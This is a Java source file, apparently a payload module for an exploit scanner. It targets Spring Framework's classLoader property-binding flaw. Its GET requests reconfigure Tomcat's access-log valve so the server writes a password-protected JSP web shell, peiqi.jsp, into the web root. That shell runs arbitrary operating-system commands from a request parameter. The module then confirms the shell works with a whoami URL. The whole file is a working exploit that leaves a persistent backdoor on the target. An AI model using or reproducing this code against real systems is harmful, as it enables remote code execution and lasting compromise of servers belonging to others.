package com.exploit;

import com.common.BasePayload;
import com.entity.VulResult;
import com.github.kevinsawicki.http.HttpRequest;

import java.util.HashMap;
import java.util.Map;

/**
 * Author 莲花
 */
public class SpringCoreGet implements BasePayload {
    public VulResult checkVUL(String url) throws Exception {
        Map<String, String> m1 = new HashMap<String, String>();
        m1.put("suffix", "%>[+]");
        m1.put("prefix", "<%");

        String pattern = url + "?class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bprefix%7Di%20if(%22peiqi%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3DRuntime.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di";
        String suffix = url + "?class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp";
        String directory = url + "?class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT";
        String prefix = url + "?class.module.classLoader.resources.context.parent.pipeline.first.prefix=peiqi";
        String fileDateFormat = url + "?class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=";
        HttpRequest.get(pattern).body();
        HttpRequest.get(suffix).body();
        HttpRequest.get(directory).body();
        HttpRequest.get(prefix).body();
        HttpRequest.get(fileDateFormat).body();
        HttpRequest.get(url).headers(m1).body();

        int code = HttpRequest.get(url + "/peiqi.jsp").code();
        if (code == 200) {
            return new VulResult(true, url + "/peiqi.jsp?pwd=peiqi&cmd=whoami");
        }
        return new VulResult(false, null);
    }
}
